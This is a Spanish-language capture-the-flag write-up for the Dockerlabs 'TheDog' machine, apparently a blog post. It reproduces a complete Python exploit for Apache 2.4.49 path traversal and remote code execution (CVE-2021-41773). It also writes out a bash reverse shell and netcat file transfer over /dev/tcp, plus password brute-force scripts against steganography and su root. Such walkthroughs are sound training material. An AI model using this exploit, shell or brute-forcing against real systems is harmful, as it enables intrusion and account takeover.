---
title: "TheDog - Dockerlabs CTF Writeup"
description: ""
pubDate: 2025-06-10
heroImage: "/img/thedog.png"
---

### Primero arracamos el contedor.

![Arrancar contenedor](/img/thedog/dog-1.png)


Escaneo de nmap

```bash
PORT   STATE SERVICE VERSION
80/tcp open  http    Apache httpd 2.4.49 ((Unix))
|_http-title: Comando Ping
| http-methods: 
|   Supported Methods: POST OPTIONS HEAD GET TRACE
|_  Potentially risky methods: TRACE
|_http-server-header: Apache/2.4.49 (Unix)
MAC Address: 02:42:AC:11:00:02 (Unknown)
```

Fuzzing de directorios

```
gobuster dir --url http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
Progress: 220560 / 220561 (100.00%)
===============================================================
Finished
===============================================================
```

No encontramos nada asi que revisamos en la web, el codigo fuento o algo

![Web](/img/thedog/dog-2.png)

![Code](/img/thedog/dog-3.png)

Es una simple web hecha con html y css y bootstrap la cual muestra información acerca del comando ping, y viendo el codigo fuente podemos ver algo oculto en la etiqueta data-note la cual esta dentro del div id container py-5, y dice que provemos a hacer fuzzing pero usando para ver archivos html.

```bash
 gobuster dir --url http://172.17.0.2 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.17.0.2
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/index.html           (Status: 200) [Size: 4688]
/html.html            (Status: 200) [Size: 766]
Progress: 441120 / 441122 (100.00%)
===============================================================
Finished
===============================================================
```

Aquí podemos ver que encontró el archivo html.html, lo cual iremos a inspeccionar ahora mismo.

![Page2](/img/thedog/dog-4.png)

De acuerdo esto nos puede dar una pista de un posible usuario. llamado punky, el cual dice que le gusta experimentar con ping. Pero recordamos que en esta maquina solo tenemos el puerto 80 abierto con lo cual hay que ver la forma de intentar conseguir explotar alguna vulnerabilidad ya que esta versión de apache es algo antigua y puede ser vulnerable.

![Code](/img/thedog/dog-5.png)

Vemos que poniendo la version del apache en exploit nos muestra que hay un exploit disponible, el cual se trata de path traversal y RCE.

Pero para ver un exploit primero hay que tener una vulnerabilidad la cual es la que coincide con el CVE-2021-41773 y que primer antes de probar ningun exploit vamos a informarnos de que consiste dicha vulnerabilidad.

Se trata de una vulnerabilidad que explota un fallo en la normalización de las rutas en Apache HTTP Server 2.4.49 en la que cualquier atacante externo podría usar un path traversal y leer archivos incluso fueral del Document Root. Si los archivos fuera del Document Root no están protegidos por la directiva ´Require all denied´, estas peticiones podrian tener exito, Además de este fallo puede filtrar el codigo fuente de archivos interpretados como scripts CGI.
	***Fuente:** hackplayers.com*

**Como se explota**

Buscamos un exploit, en github, como este https://github.com/thehackersbrain/CVE-2021-41773 

```python
# Exploit Title: Apache HTTP Server 2.4.49 - Path Traversal & Remote Code Execution (RCE)
# Exploit Author: Gaurav Raj https://gauravraj.xyz
# Vendor Homepage:  https://apache.org/
# Version: 2.4.49
# Tested on: 2.4.49
# CVE : CVE-2021-41773


#!/usr/bin/python3

import argparse
import requests


def runcmd(target):
    url = 'http://{}'.format(target)
    req = requests.get(url)
    while True:
        cmd = input("\033[1;36m>>> \033[0m")
        if (cmd != 'exit'):
            if ('https' not in req.url):
                url = "http://{}/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh".format(
                    target)
            else:
                url = "https://{}/cgi-bin/.%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/%2e%2e/bin/sh".format(
                    target)
            data = "echo Content-Type: text/plain; echo; {}".format(cmd)
            session = requests.Session()
            req = requests.Request(
                method='POST', url=url, data=data).prepare()
            req.url = url
            print(session.send(req).text, end='')

        else:
            exit(0)


def banner():
    print('''--------------------------------------------------------
|                \033[1;32mApache2 2.4.49\033[1;37m - \033[1;31mExploit\033[0m              |
--------------------------------------------------------''')


def main():
    parser = argparse.ArgumentParser(description="Apache2 2.4.49 Exploit")
    parser.add_argument(
        '-t', '--target', help='Specify the target IP or Domain. eg: 127.0.0.1 or example.com', required=True)
    arg = parser.parse_args()
    banner()
    try:
        runcmd(arg.target)
    except KeyboardInterrupt:
        exit(1)
    except EOFError:
        exit(1)


if __name__ == '__main__':
    main()
```

Lo ejecutamos. 

![Pwned](/img/thedog/dog-6.png)

y a continuación nos abrimos una netcat para crear una reverse shell que apunte a nuestra maquina y conseguir una mejor conexion con la maquina para que no este tan limitada la shell actual y trabajar mejor.

Ejecutamos el siguiente comando para crear un script con la reverse shell

```
>>>  echo "/bin/bash -i >& /dev/tcp/172.17.0.1/4444 0>&1 " > /tmp/rev.sh  
>>> ls -l /tmp
total 20
-rw-rw-r-- 1 root     punky    335 May 11 06:21 elevacion.log
-rw-r--r-- 1 root     root     115 May 11 06:08 punky_log.txt
-rw-rw-r-- 1 root     punky    656 May 11 06:18 punky_output.log
-rw-r--r-- 1 www-data www-data  47 Jun  9 03:40 rev.sh
-rw-r--r-- 1 root     root     168 May 11 06:07 task_manager.log
>>> 
```

y ahora con netcat abrirmos para con el puerto 4444 a la escucha

`nc -nlvp 4444`

y ejecutamos el script

`bash /tmp/rev.sh`

y ya tenemos una shell mejor
```bash
nc -nlvp 4444
listening on [any] 4444 ...


connect to [172.17.0.1] from (UNKNOWN) [172.17.0.2] 57340
bash: cannot set terminal process group (9): Inappropriate ioctl for device
bash: no job control in this shell
www-data@7d1187c78f95:/usr/bin$ 
www-data@7d1187c78f95:/usr/bin$ 
www-data@7d1187c78f95:/usr/bin$ 
```

y por ultimo vamos a tratar un poco la tty

``` bash
script /dev/null -c bash
ctrl+z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
```

ahora lo que vamos a buscar es por ejemplo acceder al usuario punky, ya que es el que nos muestra en la pagina html.html y luego conseguir escalar a root.

**POST EXPLOTACION**

En mi caso ejecutando linpeas un script mas automatico he visto lo siguente 

``` bash
 Files with Interesting Permissions ╠══════════════════════
                      ╚════════════════════════════════════╝
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid
strace Not Found
-rwsr-xr-x 1 root root 55K Dec  5  2024 /usr/bin/su
-rwsr-xr-x 1 root root 72K May 31  2024 /usr/bin/chfn  --->  SuSE_9.3/10
-rwsr-xr-x 1 root root 63K May 31  2024 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)
-rwsr-xr-x 1 root root 44K May 31  2024 /usr/bin/chsh
-rwsr-xr-x 1 root root 75K May 31  2024 /usr/bin/gpasswd
-rwsr-xr-x 1 root root 40K May 31  2024 /usr/bin/newgrp  --->  HP-UX_10.20
-rwsr-xr-x 1 root root 51K Dec  5  2024 /usr/bin/mount  --->  Apple_Mac_OSX(Lion)_Kernel_xnu-1699.32.7_except_xnu-1699.24.8
-rwsr-xr-x 1 root root 39K Dec  5  2024 /usr/bin/umount  --->  BSD/Linux(08-1996)
-rwsr-sr-x 1 daemon daemon 55K Apr  1  2024 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
-rwsr-x--- 1 root suidgroup 17K May 11 08:55 /usr/local/bin/task_manager (Unknown SUID binary!)
-rwsr-xr-- 1 root messagebus 35K Aug  9  2024 /usr/lib/dbus-1.0/dbus-daemon-launch-helper

╔══════════╣ SGID
╚ https://book.hacktricks.wiki/en/linux-hardening/privilege-escalation/index.html#sudo-and-suid
-rwxr-sr-x 1 root shadow 27K May 31  2024 /usr/bin/expiry
-rwxr-sr-x 1 root shadow 71K May 31  2024 /usr/bin/chage
-rwxr-sr-x 1 root crontab 55K Jan 16  2024 /usr/bin/crontab
-rwsr-sr-x 1 daemon daemon 55K Apr  1  2024 /usr/bin/at  --->  RTru64_UNIX_4.0g(CVE-2002-1614)
-rwxr-sr-x 1 root shadow 31K May  3  2024 /usr/sbin/unix_chkpwd
-rwxr-sr-x 1 root shadow 27K May  3  2024 /usr/sbin/pam_extrausers_chkpwd
-r-xr-sr-x 1 root postdrop 23K Apr  9  2024 /usr/sbin/postqueue
-r-xr-sr-x 1 root postdrop 23K Apr  9  2024 /usr/sbin/postdrop

```

Podemos usar el binario /usr/bin/at, pero viendo la pagina de gfobins, necesitamos un usuario

Pero, en la carpeta /usr/include/musica en la que un mensage en .stego nos llama la atencion acerca de alguna posible contrasena 
```bash
www-data@7d1187c78f95:/tmp$ ls -la /usr/include/musica/
total 2868
drwxr-xr-x 1 root     root        4096 May 11 09:17 .
drwxr-xr-x 1 root     root        4096 May  3 06:08 ..
-rw-rw---- 1 www-data www-data     265 May 11 09:17 .stego
-rw-r--r-- 1 www-data www-data 2918537 May  4 06:19 elperro.mp3
-r-------- 1 www-data root         917 May  9 01:20 miletra.txt
www-data@7d1187c78f95:/tmp$ cat /usr/include/musica/.stego 
Descarga el fichero como insinua la web y realiza fuerza bruta para hallar el password que esconde la contraseña del usuario.
Ten en cuenta que la salida del comando "snow" siempre devuelve datos y ha sido escondida  con el siguinete formato password:XXXXXXXXXX


www-data@7d1187c78f95:/tmp$
```

Así que con ayuda de netcat nos traemos los dos ficheros miletra.txt y elperro.mp3

Primero con netcat abrimos el puerto 443 en un maquina y apuntamos para que descarge el fichero mi letra.

`nc -nlvp 443 > miletra.txt`

y en la maquina host 

`cat /usr/include/musica/miletra.txt > /dev/tcp/172.17.0.1/443 `

y repetimos el mismo paso para el otro fichero.

Ahora nos instalamos el binario snow, el cual muestra en la descripcion en el fichero .stego
se puede descargar desde aqui.

`https://darkside.com.au/snow/`

y para poder descrifrar el fichero ya que esta cifrado y si hacemos snow -C miletra.txt nos va a devolver caracters sin sentido podemos crear un script en bash sencillo para que lo pueda descifrar.

Salida del comando de snow

```bash
./snow -C miletra.txt
ieonmenei  stsiPd          
```

Script en bash

```bash
#!/bin/bash

FILE="miletra.txt"
WORDLIST="/usr/share/wordlists/rockyou.txt"  # Cambia por tu diccionario si es otro

while IFS= read -r PASS; do
    OUTPUT=$(./snow-20130616/snow -C -p "$PASS" "$FILE" 2>/dev/null)
    
    if echo "$OUTPUT" | grep -q "password:"; then
        echo "[+] Contraseña encontrada: $PASS"
        echo "[+] Mensaje oculto: $OUTPUT"
        break
    fi
done < "$WORDLIST"        
```

el cual usando el rockyou y el binario de snow que descargamos nos devolvera el password que encuentre

```bash
bash brute-snow.sh
[+] Contraseña encontrada: superman
[+] Mensaje oculto: password:secret
```

en este caso podemos ver que la contreseña para descifrar el fichero txt es superman y la contraseña oculta es secret, así que vamos a acceder al usuario punky.

```bash
www-data@7d1187c78f95:/tmp$ su punky
Password: 
punky@7d1187c78f95:/tmp$ id
uid=1001(punky) gid=1001(punky) groups=1001(punky),100(users),1002(suidgroup)
punky@7d1187c78f95:/tmp$ 
```

Buscamos por ejemplo si existen algun binario el cual poder escalar  a root

```bash
punky@7d1187c78f95:/tmp$ sudo -l
bash: sudo: command not found
punky@7d1187c78f95:/tmp$ find / -type f -perm -4000 2>/dev/null
/usr/bin/su
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/chsh
/usr/bin/gpasswd
/usr/bin/newgrp
/usr/bin/mount
/usr/bin/umount
/usr/bin/at
/usr/local/bin/task_manager
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
punky@7d1187c78f95:/tmp$ ^C
punky@7d1187c78f95:/tmp$ 
```

y me llama la atencion el que dice task_manager 


```bash
/usr/local/bin/task_manager
-rwsr-x--- 1 root suidgroup 16712 May 11 08:55 /usr/local/bin/task_manager
```

el cual ejecutamos con un -h para ver que podemos hacer con el

```bash
punky@7d1187c78f95:/tmp$ /usr/local/bin/task_manager -h
Uso: /usr/local/bin/task_manager -d <detalles_de_tarea> [-c <archivo_config>] [-o <archivo_log>]
Opciones:
  -d DETALLES   Descripción de la tarea a ejecutar/registrar. ¡Este es el importante!
  -c CONFIG     Ruta al archivo de configuración de la tarea (opcional).
  -o OUTPUT_LOG Ruta al archivo donde se registrará la salida (opcional).
  -h            Muestra esta ayuda.

PISTA: Los detalles a veces pueden ser... más que simples palabras.
punky@7d1187c78f95:/tmp$ 
```

Despues de probar unas cuantos ficheros usando task_manager decido a usar el comando strings apuntando al binario task_manager.

``` bash
punky@7d1187c78f95:/tmp$ strings /usr/local/bin/task_manager 
/lib64/ld-linux-x86-64.so.2
snprintf
puts
perror
strncpy
__stack_chk_fail
fopen
system
time
strstr
stdout
optarg
__libc_start_main
stderr
fprintf
getopt
__cxa_finalize
fclose
fwrite
strncmp
libc.so.6
GLIBC_2.4
GLIBC_2.2.5
GLIBC_2.34
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
PTE1
u+UH
[INFO] Preparando para registrar acci
n de tarea.
/usr/local/bin/system_logger --source task_manager --event "TASK_EXECUTION" --details "%s"
[%ld] Acci
n de tarea con detalles iniciales (sanitizados) '%s' procesada.
[ERROR] No se pudo abrir el log de salida
password
123456
qwerty
admin
guest
root
user
hannah
default
1234
```

y veo com que tiene un pequeño wordlist incluido tal vez copiando me esas contraseñas en un fichero diccionario.txt y creando me otro script pueda conseguir el password de root.

```bash
#!/bin/bash

# Archivo con lista de contraseñas (una por línea)
WORDLIST="dic.txt"

# Usuario al que intentar acceder
USER="root"

# Archivo para guardar contraseñas probadas
LOGFILE="su_bruteforce.log"

# Intentar cada password
while IFS= read -r password; do
    echo "Probando contraseña: $password"

    # Intentar hacer su con password (timeout 5s para no colgar)
    echo "$password" | timeout 5 su -c "id" $USER 2>/dev/null >/dev/null

    # Revisar código de salida (0 = éxito)
    if [ $? -eq 0 ]; then
        echo "Contraseña encontrada: $password"
        echo "$password" > success_password.txt
        exit 0
    fi

done < "$WORDLIST"

echo "No se encontró la contraseña en el diccionario."
exit 1
```

Aquí podemos ver que nos devolvio la contraseña para root y ya somos root.
```bash
punky@7d1187c78f95:/tmp$ su 
Password: 
root@7d1187c78f95:/tmp# id
uid=0(root) gid=0(root) groups=0(root)
root@7d1187c78f95:/tmp# whoami
root
root@7d1187c78f95:/tmp# 
```